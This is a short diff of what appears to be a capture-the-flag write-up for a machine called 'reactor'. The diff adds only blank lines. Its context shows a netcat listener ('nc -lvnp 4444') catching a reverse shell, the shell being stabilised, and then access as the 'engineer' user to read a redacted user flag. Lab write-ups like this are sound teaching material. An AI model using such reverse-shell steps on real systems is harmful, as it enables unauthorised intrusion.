@@ -245,6 +245,7 @@ zsh: suspended  nc -lvnp 4444
 [1]  + continued  nc -lvnp 4444
                                export TERM=xterm
 node@reactor:/opt/reactor-app$ 
+
 ```
 
 ### Source block 3 (`bash`)
@@ -293,6 +294,7 @@ engineer@reactor:~$ ls
 user.txt
 engineer@reactor:~$ cat user.txt 
 <USER_FLAG_REDACTED>
+
 ```
 
 ### Source block 5 (`bash`)
